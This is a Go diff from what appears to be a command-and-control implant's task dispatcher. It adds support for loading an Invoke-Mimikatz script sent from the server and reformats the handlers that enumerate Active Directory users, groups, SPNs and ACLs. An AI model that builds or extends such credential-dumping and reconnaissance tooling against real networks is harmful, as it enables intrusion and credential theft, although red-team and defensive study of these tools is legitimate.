@@ -20,7 +20,8 @@ func handleCreds(task Task, res *TaskResult) {
 }
 
 func handleMimikatz(task Task, res *TaskResult) {
-	out, err := runMimikatz(task.Command)
+	// Optional task.Data: base64 of Invoke-Mimikatz.ps1 from server module store
+	out, err := runMimikatz(task.Command, task.Data)
 	if err != nil {
 		res.Error = err.Error()
 	} else {
@@ -358,32 +359,56 @@ func handleRemoteInput(task Task, res *TaskResult) {
 
 func handleLDAPUsers(task Task, res *TaskResult) {
 	out, err := ldapUsers()
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 func handleLDAPGroups(task Task, res *TaskResult) {
 	out, err := ldapGroups()
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 func handleLDAPComputers(task Task, res *TaskResult) {
 	out, err := ldapComputers()
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 func handleLDAPSPN(task Task, res *TaskResult) {
 	out, err := ldapSPN()
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 func handleLDAPACL(task Task, res *TaskResult) {
 	out, err := ldapACL()
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 func handleLDAPQuery(task Task, res *TaskResult) {
 	out, err := ldapQuery(task.Command)
-	if err != nil { res.Error = err.Error() } else { res.Output = out }
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = out
+	}
 }
 
 // ── Persistence ──────────────────────────────────────────────────────────
